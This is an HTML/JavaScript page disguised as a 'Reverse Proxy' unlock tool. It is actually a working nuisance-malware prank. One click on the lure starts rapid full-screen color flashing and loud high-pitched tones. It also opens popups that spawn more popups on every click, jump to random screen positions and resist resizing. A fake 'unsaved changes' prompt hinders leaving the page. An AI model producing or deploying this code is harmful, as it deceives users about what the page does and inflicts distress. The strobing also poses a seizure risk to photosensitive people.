<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>Unlock</title>
<style>
  html,body { height:100%; margin:0; background:black; }
  #overlay {
    position:fixed; inset:0; display:flex; align-items:center; justify-content:center;
    background:black; color:white; font-size:2rem; cursor:pointer;
  }
</style>
</head>
<body>
<div id="overlay">Click to start the Reverse Proxy</div>

<script>
let chaosStarted = false;
let popupWindows = [];
let audioCtx = null;

// Unsaved work warning
let hasUnsavedChanges = true;
window.addEventListener("beforeunload", function (e) {
  if (hasUnsavedChanges) {
    e.preventDefault();
    e.returnValue = ''; // triggers the browser's builtâ€‘in prompt
  }
});

// Main page effects
function startMainEffects() {
  try { audioCtx = new (window.AudioContext || window.webkitAudioContext)(); } catch(e){}
  setInterval(() => {
    document.body.style.backgroundColor =
      'hsl(' + Math.floor(Math.random()*360) + ',100%,50%)';
  }, 120);
  setInterval(() => {
    if (!audioCtx) return;
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    // Sharp, loud sound
    osc.type = Math.random() > 0.5 ? 'square' : 'sawtooth';
    osc.frequency.value = 800 + Math.random() * 3000; // high pitch
    gain.gain.setValueAtTime(0.5, audioCtx.currentTime); // loud
    gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.15);
    osc.connect(gain).connect(audioCtx.destination);
    osc.start();
    osc.stop(audioCtx.currentTime + 0.15);
  }, 200);
}

// HTML for popup
const popupContent = `
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>!@#$%^&*())(*^*&#!#%(*</title>
<style>html,body{margin:0;height:100%;cursor:pointer;}</style></head>
<body>
<script>
const minW = 200; // smallest width
const minH = 150; // smallest height

function enforceMinSize() {
  try {
    if (window.outerWidth !== minW || window.outerHeight !== minH) {
      window.resizeTo(minW, minH);
    }
  } catch(e) {}
}
setInterval(enforceMinSize, 100);

// Color chaos
setInterval(() => {
  document.body.style.backgroundColor =
    'hsl(' + Math.floor(Math.random()*360) + ',100%,50%)';
}, 100);

// Loud, sharp sounds
setInterval(() => {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = Math.random() > 0.5 ? 'square' : 'sawtooth';
    osc.frequency.value = 1000 + Math.random()*4000; // very high pitch
    gain.gain.setValueAtTime(0.5, ctx.currentTime); // loud
    gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.12);
    osc.connect(gain).connect(ctx.destination);
    osc.start();
    osc.stop(ctx.currentTime + 0.12);
    osc.onended = () => ctx.close && ctx.close();
  } catch(e){}
}, 180);

// Clicking inside popup spawns more popups
document.addEventListener("click", () => {
  if (window.opener && !window.opener.closed) {
    window.opener.spawnPopup();
  }
});
<\/script>
</body>
</html>
`;

// Spawn popup
function spawnPopup() {
  const minW = 200, minH = 150;
  const w = window.open('', '_blank', `width=${minW},height=${minH},left=150,top=150`);
  if (w) {
    w.document.open();
    w.document.write(popupContent);
    w.document.close();
    popupWindows.push(w);

    // Random movement
    const moveInterval = setInterval(() => {
      if (w.closed) {
        clearInterval(moveInterval);
        return;
      }
      try {
        const x = Math.floor(Math.random() * Math.max(1, screen.availWidth - minW));
        const y = Math.floor(Math.random() * Math.max(1, screen.availHeight - minH));
        w.moveTo(x, y);
      } catch (err) {
        clearInterval(moveInterval);
      }
    }, 80);
  }
}

document.getElementById("overlay").addEventListener("click", () => {
  if (chaosStarted) return;
  chaosStarted = true;
  document.getElementById("overlay").style.display = "none";
  startMainEffects();
  spawnPopup();
  document.addEventListener("click", spawnPopup, { passive: true });
});

window.addEventListener("beforeunload", () => {
  popupWindows.forEach(w => { try { w.close(); } catch(e){} });
});
</script>
</body>
</html>
